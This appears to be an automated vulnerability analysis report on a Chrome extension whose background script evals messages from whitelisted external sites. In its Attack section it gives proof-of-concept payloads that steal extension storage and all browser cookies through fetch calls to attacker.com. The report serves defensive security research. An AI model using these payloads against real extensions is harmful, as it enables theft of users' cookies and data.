# CoCo Analysis: ipblgpcofgkbamaebanhknbnfkecmkjb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_external_port_onMessage → eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ipblgpcofgkbamaebanhknbnfkecmkjb/opgen_generated_files/bg.js
Line 975 - eval(message) where message comes from external connection

**Code:**

```javascript
// Background script (bg.js) - Line 1053-1059
chrome.runtime.onConnectExternal.addListener(function(connect) {
   var Ext2Web = connect;  // ← External connection from whitelisted websites
   appPorts[++count] = { web: Ext2Web };
   var Ext2Helper = chrome.runtime.connectNative("com.visualon.chrome.plugin.helper");
   Ext2Web.onMessage.addListener(onWebMessage(count, Ext2Helper));  // ← Listens to external messages
   Ext2Helper.onMessage.addListener(onNativeMessage(count, Ext2Web));
   Ext2Helper.onDisconnect.addListener(onDisconnected(count, Ext2Web));
});

// Line 973-1024 - onWebMessage function
function onWebMessage(id, ext2helper) {
   return function(message) {
      var obj = eval(message);  // ← DIRECT EVAL OF EXTERNAL MESSAGE - attacker-controlled
      var cmd = obj.cmd;  // ← attacker-controlled
      var port = obj.port;
      console.log('ID = ' + id + ' send cmd = ' + cmd + ' to port = ' + port);

      if (cmd === 'e_play') {
         // ... processing ...
      }
      else if (cmd === 'e_stop_success') {
         // ... processing ...
      }
      else if (cmd === 'e_multi_inst') {
         // ... processing ...
      }
      else if (cmd === 'e_inst_cnt') {
         // ... processing ...
      }
      else{
         try { ext2helper.postMessage(obj); }
         catch (e) { console.log(e); }
      }
   }
}
```

**Manifest externally_connectable:**
```json
"externally_connectable": {
  "matches": [
    "*://localhost:*/*",
    "*://wifire.inventos.ru:*/*",
    "*://www.wifire.tv:*/*",
    "*://wifire.tv:*/*",
    "*://staging.wifire.tv:*/*",
    "*://www.staging.wifire.tv:*/*"
  ]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message via chrome.runtime.onConnectExternal

**Attack:**

```javascript
// From any whitelisted domain (e.g., wifire.tv, localhost)
// Exploit code injection via eval()

var port = chrome.runtime.connect("extension_id");

// Attack 1: Execute arbitrary code via eval
port.postMessage("console.log('XSS'); chrome.storage.local.get(null, function(data) { fetch('https://attacker.com/exfil', {method: 'POST', body: JSON.stringify(data)}) })");

// Attack 2: More stealthy code execution
port.postMessage("({cmd: 'malicious', data: (function(){ /* arbitrary code */ return 'payload'; })()})");

// Attack 3: Direct code execution bypassing cmd checks
port.postMessage("(function(){ chrome.cookies.getAll({}, function(cookies){ fetch('https://attacker.com/steal', {method: 'POST', body: JSON.stringify(cookies)}) }); return {cmd: 'safe'} })()");
```

**Impact:** Remote code execution in extension context with full extension permissions (nativeMessaging, background). An attacker controlling any of the whitelisted domains (including localhost for local attacks) can execute arbitrary JavaScript code in the extension's background page context via eval(). This allows the attacker to:
1. Execute arbitrary code with extension privileges
2. Access native messaging to communicate with the native application
3. Steal sensitive data from extension storage
4. Manipulate browser state via Chrome APIs
5. Potentially compromise the native application through the native messaging interface

The vulnerability is particularly severe because the extension has nativeMessaging permission and connects to a native application ("com.visualon.chrome.plugin.helper"), allowing potential escalation to native code execution.
